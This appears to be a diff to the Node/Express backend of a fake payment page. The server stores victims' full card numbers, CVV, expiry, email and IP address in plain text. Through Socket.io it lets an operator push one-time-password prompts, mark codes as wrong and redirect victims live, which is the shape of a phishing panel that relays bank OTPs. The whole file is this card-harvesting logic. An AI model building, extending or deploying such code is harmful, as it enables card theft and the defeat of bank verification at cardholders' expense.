@@ -1,12 +1,23 @@
+// server.js
 import express from 'express';
 import bodyParser from 'body-parser';
 import cors from 'cors';
 import crypto from 'crypto';
+import http from 'http';
+import { Server } from 'socket.io';
+import path from 'path';
+import { fileURLToPath } from 'url';
 
 const app = express();
 app.use(bodyParser.json());
 app.use(cors());
-app.use(express.static("."));
+// Serve static files from the "public" folder
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
+app.use(express.static(path.join(__dirname, 'public')));
+
+const server = http.createServer(app);
+const io = new Server(server);
 
 const transactions = new Map();
 const paymentLinks = new Map();
@@ -14,10 +25,14 @@ const paymentLinks = new Map();
 // Generate payment link endpoint (links to landing.html)
 app.post('/api/generatePaymentLink', (req, res) => {
   const { amount, description } = req.body;
+  if (!amount || !description) {
+    return res.status(400).json({ status: "error", message: "Missing amount or description" });
+  }
   const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
   // Link directs to landing.html with pid query parameter
   const paymentLink = `${req.protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;
   paymentLinks.set(invoiceId, { amount, description, paymentLink, createdAt: new Date().toISOString() });
+  console.log("Payment link generated:", paymentLink);
   res.json({ status: "success", paymentLink });
 });
 
@@ -50,16 +65,22 @@ app.get('/api/transactions', (req, res) => {
 // Process payment details
 app.post('/api/sendPaymentDetails', (req, res) => {
   const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
+  if (!cardNumber || !expiry || !cvv || !email || !amount || !currency || !cardholder) {
+    return res.status(400).json({ status: "error", message: "Missing payment details" });
+  }
+  // Capture IP address from request
+  const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
   const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
   const transaction = {
     id: invoiceId,
-    cardNumber, // Cleaned on client side
+    cardNumber,
     expiry,
     cvv,
     email,
     amount: amount.toString().replace(/,/g, ''),
     currency,
     cardholder,
+    ip, // Save IP address
     status: 'processing',
     otp: null,
     otpShown: false,
@@ -83,6 +104,8 @@ app.post('/api/showOTP', (req, res) => {
   txn.otpShown = true;
   txn.status = 'otp_pending';
   txn.otpError = false;
+  console.log(`Show OTP command issued for invoice ${invoiceId}`);
+  io.to(invoiceId).emit('show_otp', { message: 'OTP form should be shown now' });
   res.json({ status: "success", message: "OTP form will be shown to user" });
 });
 
@@ -95,6 +118,7 @@ app.post('/api/wrongOTP', (req, res) => {
   }
   txn.otpError = true;
   txn.status = 'otp_pending';
+  console.log(`OTP marked as wrong for invoice ${invoiceId}`);
   res.json({ status: "success", message: "OTP marked as wrong" });
 });
 
@@ -140,17 +164,28 @@ app.post('/api/updateRedirectStatus', (req, res) => {
   }
   txn.redirectStatus = redirectStatus;
   console.log(`Transaction ${invoiceId} redirect status updated to: ${redirectStatus}`);
+  const redirectUrl = redirectStatus === 'success'
+    ? `/success.html?invoiceId=${invoiceId}`
+    : `/fail.html?invoiceId=${invoiceId}`;
+  io.to(invoiceId).emit('redirect', { redirectStatus, redirectUrl });
   res.json({
     status: "success",
     invoiceId,
     redirectStatus,
-    redirectUrl: redirectStatus === 'success'
-      ? `/success.html?invoiceId=${invoiceId}`
-      : `/fail.html?invoiceId=${invoiceId}`
+    redirectUrl
+  });
+});
+
+// Socket.io connection handling
+io.on('connection', (socket) => {
+  console.log('Socket connected:', socket.id);
+  socket.on('join', (invoiceId) => {
+    socket.join(invoiceId);
+    console.log(`Socket ${socket.id} joined room ${invoiceId}`);
   });
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
+server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
